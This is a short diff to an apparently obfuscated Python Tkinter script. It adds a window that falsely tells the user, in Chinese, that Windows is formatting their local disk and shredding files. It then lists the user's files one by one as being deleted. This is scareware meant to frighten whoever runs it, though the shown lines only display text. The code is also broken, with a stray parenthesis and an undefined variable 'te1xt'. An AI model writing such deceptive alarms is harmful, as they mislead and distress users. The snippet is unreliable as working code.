@@ -36,6 +36,14 @@ def _d():
 def _f():
     _f=Tk()
     __dl=_d()
+    _l=Label(_f)
+    _l.pack()
+    _l["text"]="Windows正在格式化您的本地磁盘。\n此主机上的条件不支持快速格式化，因此将逐个粉碎文件。")
+    _t=Text(_f)
+    font1 = font.Font(family='微软雅黑')
+    te1xt.config(font=font1)
+    for i in __dl:
+        _t.insert(END,"删除文件 - "+i+"\n")
     
     
 #
